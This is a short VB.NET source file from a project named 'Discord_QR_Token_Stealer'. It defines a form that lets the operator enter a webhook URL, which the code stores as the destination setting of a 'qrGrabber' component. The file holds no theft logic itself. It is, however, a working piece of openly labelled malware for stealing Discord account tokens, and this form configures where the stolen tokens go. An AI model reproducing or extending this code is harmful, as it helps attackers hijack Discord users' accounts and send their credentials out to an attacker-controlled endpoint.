Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Drawing
Imports System.Linq
Imports System.Text
Imports System.Threading.Tasks
Imports System.Windows.Forms

Namespace Discord_QR_Token_Stealer
	Partial Public Class setHook
		Inherits Form

		Public Sub New()
			InitializeComponent()
		End Sub

		Private Sub set_Click(ByVal sender As Object, ByVal e As EventArgs) Handles set.Click
			' set the url and close
			qrGrabber.webhookUrl = hook.Text
			Close()
		End Sub
	End Class
End Namespace
